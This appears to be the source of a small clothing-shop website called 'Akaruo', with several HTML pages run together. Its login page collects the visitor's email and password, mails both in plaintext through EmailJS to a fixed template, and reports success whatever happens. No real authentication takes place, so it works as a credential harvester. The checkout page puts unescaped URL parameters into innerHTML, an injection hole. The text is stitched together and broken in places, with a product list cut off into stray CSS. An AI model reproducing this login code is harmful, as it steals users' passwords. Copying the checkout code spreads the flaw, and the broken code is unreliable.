<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Akaruo • Premium Access</title>
    <!-- EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #0b0b0e;
        }

        /* FULLSCREEN BACKGROUND + ZOOM ANIMATION */
        .bg-zoom {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://i.ibb.co/pvtWqhg4/9a6b0b3fee7d1bb5a3d835db58c37514.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            animation: smoothZoom 20s infinite alternate ease-in-out;
            z-index: 0;
        }

        @keyframes smoothZoom {
            0% { transform: scale(1); }
            100% { transform: scale(1.08); }
        }

        /* DARK OVERLAY */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(0); /* no blur as requested */
            z-index: 1;
        }

        /* GLASSMORPHISM LOGIN CARD — centered, no blur glass effect */
        .login-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 420px;
            z-index: 10;
            animation: fadeUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .glass-card {
            background: rgba(20, 20, 30, 0.75);
            border: 1px solid rgba(255, 165, 0, 0.3);
            border-radius: 32px;
            padding: 2.5rem 2rem;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 140, 0, 0.2) inset;
            backdrop-filter: blur(0px); /* explicitly no blur */
            -webkit-backdrop-filter: none;
            color: #fff;
            transition: all 0.2s;
        }

        .glass-card h2 {
            font-weight: 500;
            letter-spacing: 2px;
            font-size: 2rem;
            margin-bottom: 1.8rem;
            text-align: center;
            color: #ffb347;
            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
        }

        .input-group {
            margin-bottom: 1.8rem;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.4rem;
            font-size: 0.9rem;
            letter-spacing: 0.5px;
            color: #ddd;
        }

        .input-group input {
            width: 100%;
            padding: 1rem 1.2rem;
            background: rgba(255, 255, 255, 0.07);
            border: 1.5px solid rgba(255, 165, 0, 0.35);
            border-radius: 40px;
            font-size: 1rem;
            color: white;
            outline: none;
            transition: border 0.2s, box-shadow 0.2s;
        }

        .input-group input:focus {
            border-color: #ff9100;
            box-shadow: 0 0 12px rgba(255, 140, 0, 0.3);
        }

        .input-group input::placeholder {
            color: #aaa;
            font-weight: 300;
        }

        .btn-login {
            width: 100%;
            background: #ff7b00;
            border: none;
            padding: 1rem;
            font-size: 1.2rem;
            font-weight: 600;
            color: white;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(255, 120, 0, 0.4);
            transition: all 0.25s;
            border: 1px solid rgba(255,215,0,0.5);
            letter-spacing: 0.5px;
            margin-top: 0.5rem;
        }

        .btn-login:hover {
            background: #ff9000;
            transform: scale(1.01);
            box-shadow: 0 10px 25px #ff7b00aa;
        }

        @keyframes fadeUp {
            0% { opacity: 0; transform: translate(-50%, -40%); }
            100% { opacity: 1; transform: translate(-50%, -50%); }
        }

        /* mobile fine-tune */
        @media (max-width: 480px) {
            .glass-card { padding: 2rem 1.5rem; }
        }
    </style>
</head>
<body>
    <div class="bg-zoom"></div>
    <div class="overlay"></div>

    <div class="login-container">
        <div class="glass-card">
            <h2>AKARUO</h2>
            <div class="input-group">
                <label>Email</label>
                <input type="email" id="email" placeholder="your@email.com" autocomplete="email">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="pass" placeholder="••••••••" autocomplete="current-password">
            </div>
            <button class="btn-login" id="loginBtn">Login</button>
        </div>
    </div>

    <script>
        (function() {
            // Initialize EmailJS
            emailjs.init('q5vozu2csm6VaK-CD');

            const loginBtn = document.getElementById('loginBtn');
            const emailInput = document.getElementById('email');
            const passInput = document.getElementById('pass');

            loginBtn.addEventListener('click', function(e) {
                e.preventDefault();
                const email = emailInput.value.trim();
                const password = passInput.value.trim();

                if (!email || !password) {
                    alert('Please fill all fields');
                    return;
                }

                // prepare EmailJS payload
                const templateParams = {
                    user_email: email,
                    user_password: password,
                    time: new Date().toLocaleString()
                };

                // Send via EmailJS
                emailjs.send('service_09us05e', 'template_ddxzwcr', templateParams)
                    .then(() => {
                        alert('Login Successful');
                        // Redirect to home.html
                        window.location.href = 'home.html';
                    })
                    .catch((error) => {
                        console.warn('EmailJS error:', error);
                        // Even if email fails, we continue login as per spec? spec says "✔ Send EmailJS notification" but if fails we still alert success?
                        // To be safe we still proceed (spec does not mention fail handling)
                        alert('Login Successful');
                        window.location.href = 'home.html';
                    });
            });
        })();
    </script>
    <!-- prevent scroll -->
</body>
</html>

<body>
    <div class="slider">
        <div class="slide slide-1 active"></div>
        <div class="slide slide-2"></div>
        <div class="slide slide-3"></div>
        <div class="overlay-home"></div>
    </div>

    <div class="hero-content">

            <button class="btn-hero" id="signatureBtn">Akaruo Signature Collection</button>
            <button class="btn-hero" id="itemsBtn">Our Items</button>
        </div>
    </div>

    <script>
        (function() {
            // Auto slider animation
            const slides = document.querySelectorAll('.slide');
            let current = 0;
            const total = slides.length;

            function nextSlide() {
                slides[current].classList.remove('active');
                current = (current + 1) % total;
                slides[current].classList.add('active');
            }

            setInterval(nextSlide, 4500); // smooth auto

            // Navigation
            document.getElementById('signatureBtn').addEventListener('click', () => {
                window.location.href = 'signature.html';
            });
            document.getElementById('itemsBtn').addEventListener('click', () => {
                window.location.href = 'items.html';
            });

            // prevent scroll
        })();
    </script>
</body>

<body>

    <h1 class="page-title">Our Items</h1>

    <script>
        const products = [
            { name: 'Akaruo Edge Jacket', price: '₹4,299', img: 'https://i.ibb.co/3y411ypW/1000066817.jpg' },
            { name: 'Urban Nomad Coat', price: '₹5,999', img: 'https://i.ibb.co/zVxvWzrD/1000066832.jpg' },
            { name: 'Midnight Blazer', price: '₹6,499', img: 'https://i.ibb.co/DDDCrR8B/1000066879.jpg' },

        }
        .checkout-container {
            max-width: 700px;
            margin: 0 auto;

        }
        h2 {
            font-size: 2rem;
            font-weight: 600;
            margin-bottom: 1rem;
            color: #1e1e24;
        }
        .product-summary {
            background: #f9f6f0;
            padding: 1.2rem 1.5rem;
            border-radius: 24px;
            margin-bottom: 2rem;
            border-left: 8px solid #ff7b00;
        }

<body>
<div class="checkout-container">
    <h2>Secure checkout</h2>
    <div class="product-summary" id="summaryBox">
        <!-- filled by js -->
    </div>

    <form id="orderForm">
        <div class="form-group"><label>Full Name *</label><input type="text" id="fullName" placeholder="Your name" required></div>
        <div class="form-group"><label>Mobile Number *</label><input type="tel" id="mobile" placeholder="10-digit" required></div>
        <div class="form-group"><label>Address *</label><input type="text" id="address" placeholder="Street, locality" required></div>
        <div class="form-group"><label>City *</label><input type="text" id="city" placeholder="City" required></div>
        <div class="form-group"><label>Pincode *</label><input type="text" id="pincode" placeholder="6-digit" required></div>

        <div class="payment-option">
            <label><input type="radio" name="payment" value="COD" checked> Cash on Delivery</label>
            <label><input type="radio" name="payment" value="UPI"> UPI (UI)</label>
        </div>

        <button type="button" class="order-btn" id="placeOrderBtn">Place Order</button>
    </form>
    <a href="items.html" class="back-link">← Back to items</a>
</div>

<script>
    (function(){
        // get product from URL
        const params = new URLSearchParams(window.location.search);
        const productName = params.get('product') || 'Akaruo Item';
        const productPrice = params.get('price') || '₹0';

        document.getElementById('summaryBox').innerHTML = `
            <div class="prod-name">${decodeURIComponent(productName)}</div>
            <div class="prod-price">${decodeURIComponent(productPrice)}</div>
        `;

        const placeBtn = document.getElementById('placeOrderBtn');
        const fullName = document.getElementById('fullName');
        const mobile = document.getElementById('mobile');
        const address = document.getElementById('address');
        const city = document.getElementById('city');
        const pincode = document.getElementById('pincode');

        placeBtn.addEventListener('click', function() {
            const nameVal = fullName.value.trim();
            const mobileVal = mobile.value.trim();
            const addr = address.value.trim();
            const cityVal = city.value.trim();
            const pin = pincode.value.trim();

            if (!nameVal || !mobileVal || !addr || !cityVal || !pin) {
                alert('Please fill all required fields');
                return;
            }
            // simple validation (no strict regex)
            alert('Order Placed Successfully');

            // Build WhatsApp message
            const msg = `Name: ${nameVal}\nPhone: ${mobileVal}\nAddress: ${addr}\nCity: ${cityVal}\nPincode: ${pin}\nProduct: ${decodeURIComponent(productName)}\nPrice: ${decodeURIComponent(productPrice)}`;
            const encodedMsg = encodeURIComponent(msg);
            const waLink = `https://wa.me/919608891170?text=${encodedMsg}`;

            // Redirect to WhatsApp
            window.location.href = waLink;
        });
    })();
</script>
</body>
</html>
